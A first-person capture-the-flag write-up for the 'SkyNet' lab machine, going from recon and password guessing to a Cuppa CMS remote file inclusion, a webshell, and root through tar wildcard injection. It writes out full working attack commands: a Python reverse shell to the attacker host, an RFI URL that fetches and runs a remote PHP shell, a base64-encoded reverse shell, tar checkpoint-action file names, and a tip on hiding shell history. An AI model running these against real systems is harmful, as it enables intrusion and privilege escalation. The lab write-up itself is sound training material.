# SkyNet

## Recon

nmap revealed:

```
Starting Nmap 7.80 ( https://nmap.org ) at 2020-04-29 03:49 UTC
Nmap scan report for ip-10-10-20-144.eu-west-1.compute.internal (10.10.20.144)
Host is up (0.00057s latency).
Not shown: 65529 closed ports
PORT    STATE SERVICE
22/tcp  open  ssh
80/tcp  open  http
110/tcp open  pop3
139/tcp open  netbios-ssn
143/tcp open  imap
445/tcp open  microsoft-ds
MAC Address: 02:33:4B:B9:0C:CE (Unknown)

Nmap done: 1 IP address (1 host up) scanned in 2.88 seconds
```

So, a website, a mail server and samba shares.

`dirb` on the website revealed a mail application, SquirrelMail, under `/squirrelmail`. The login page looked simple enough, but I needed a username and password.

`enum4linux` on the smb share revealed a username `milesdyson` and two shares: `/anonymous` and a restricted `/milesdyson`

## Hydra

Initially I tried `hydra`'ing the squirrel login using `milesdyson` and `rockyou.txt`. While that was running, I connected to the anonymous share and poked about. Apart from a huge and funny collection of machine learning books, there was a note saying all passwords had been reset, and three log files, of which only the first (`log1.txt`) had any content.

The log file contained a list of permutations on the word 'terminator'. On a whim, since `rockyou` wasn't getting me anywhere, I tried using the log file as a password source instead. The first entry `cyborg007haloterminator` worked :)

## Mail server, authed smb and hidden CMS

After logging in to squirrelmail, I found an email that contained a new SMB password:

```
Subject:   	Samba Password reset
From:   	skynet@skynet
Date:   	Tue, September 17, 2019 10:10 pm
Priority:   	Normal
Options:   	View Full Header |  View Printable Version  | Download this as a file

We have changed your smb password after system malfunction.
Password: )s{A&2Z=F^n_E.B`
```

I promptly used this with `smbclient -U milesdyson` to access the restricted share. In there, a level or two deep and buried in a huge set of markdown files I found a text file called `important.txt`

Inside this was a list of tasks:

```

1. Add features to beta CMS /45kra24zxs28v3yd
2. Work on T-800 Model 101 blueprints
3. Spend more time with my wife
```

I browsed to that path and found a hidden page on the main site. A `dirb` on the page revealed `/45kra24zxs28v3yd/administrator`, which when browsed to, revealed itself as 'Cuppa CMS'.

## Remote file inclusion and shell

Cuppa is vulnerable to remote file inclusion, even unauthenticated, as described here on exploit-db: https://www.exploit-db.com/exploits/25971

I tested this with `/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=../../../../../../../../../etc/passwd` and successfully got the contents of the local `passwd` file, all to the good. 

Next I quickly grabbed the user flag, guessing it would be as it is on most TryHackMe VMs: `/home/milesdyson/user.txt`. Success!

The exploit would include anything, even a url, so I downloaded a simple request CMD php shell from github, spun up a `python3 -m http.server`, and then tested command execution: `http://10.10.20.144/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?cmd=whoami&urlConfig=http://10.10.151.47:8000/easy-simple-php-webshell.php` (note the `cmd` param before the `urlConfig`). That magic `www-data` showed up.

The next step was to get a reverse shell. I like to use this python one liner, when I find `nc -e` doesn't work:

```
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.151.47",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

To get it working with the exploit, I url-encoded the above using Burp, then I stuck it into the url cmd parameter while I had a netcat listener running. Boom! Into the system.

## cronjobs and admin

First I fixed up the shell with the standard python tty: `python -c "import pty; pty.spawn('/bin/bash')"`. Then I tried `sudo -l` but it required the www-data password. Next step was to browse about and see what I could see.

In `/home/milesdyson` there were a few funny things, including `.bash_history` symlinked to `/dev/null` (a way of obliterating any tracks? Must remember that...). More interesting was a folder owned by root called 'backups'. In there were two files: a `backup.tgz` file, and a `backup.sh`. I smelled a cron job.

Sure enough, `cat /etc/crontab` revealed that root called that backup script every minute. The contents of `backup.sh` was:

```
#!/bin/bash
cd /var/www/html
tar cf /home/milesdyson/backups/backup.tgz *
```

I couldn't append to the file, as I didn't have access to the folder. However, I *did* have access, write access, to `/var/www/html` as `www-data`.

But what could I do? I can't change root's `PATH`, so can't make them run something other than cd or tar. The `tar cf` had to be the key though, and so I looked about online. 

Sure enough, there is unexpected behaviour when using a wildcard with tar. Specifically, if files in the target directory are ALSO valid tar arguments, they get interpreted as such. I picked this up from this newsblog: https://www.helpnetsecurity.com/2014/06/27/exploiting-wildcards-on-linux/

Going to `/var/www/html`, I created three files:

```
touch ./--checkpoint=1
touch ./--checkpoint-action=exec=sh\ shell.sh
```

and then finally:

```
echo cHl0aG9uIC1jICdpbXBvcnQgc29ja2V0LHN1YnByb2Nlc3Msb3M7cz1zb2NrZXQuc29ja2V0KHNvY2tldC5BRl9JTkVULHNvY2tldC5TT0NLX1NUUkVBTSk7cy5jb25uZWN0KCgiMTAuMTAuMTUxLjQ3Iiw0NDQ0KSk7b3MuZHVwMihzLmZpbGVubygpLDApOyBvcy5kdXAyKHMuZmlsZW5vKCksMSk7IG9zLmR1cDIocy5maWxlbm8oKSwyKTtwPXN1YnByb2Nlc3MuY2FsbChbIi9iaW4vc2giLCItaSJdKTsn | base64 -d > shell.sh
```

This last takes a base 64 encoded python reverse shell one liner (as used before, above) and decodes it into a file.

Setting up a nc reverse listener, within a minute I had the magic pop of a root shell and got the final flag from /root :)
